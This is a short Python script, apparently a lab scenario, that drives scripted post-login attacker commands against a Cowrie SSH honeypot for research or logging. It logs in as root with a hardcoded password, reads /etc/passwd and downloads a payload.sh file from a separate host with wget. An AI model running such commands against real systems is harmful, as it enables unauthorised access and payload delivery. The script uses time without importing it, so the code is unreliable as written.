# Author: Lazaro Perez Jr.

# Scenario 2: Scripted post-login commands on Cowrie
import paramiko
output_file = 'paramiko.org'
def paramiko_A(command):
        hostname='172.30.0.20'
        print('running')
        try:
                port='22'
                client=paramiko.SSHClient()
                client.load_system_host_keys()
                client.connect(hostname,port=22, username='root',password='admin123')
                (stdin,stdout,stderr)=client.exec_command(command)
                cmd_output=stdout.read()
                print('log printing: ', command, cmd_output)
                with open(output_file,"w+") as file:
                        file.write(str(cmd_output))
                return output_file
        finally:
                client.close()
paramiko_A('uname -a')
paramiko_A('whoami')
paramiko_A('id')
paramiko_A('cat /etc/passwd')
paramiko_A('wget http://172.30.0.10:8000/payload.sh')
time.sleep(1)
paramiko_A('exit')

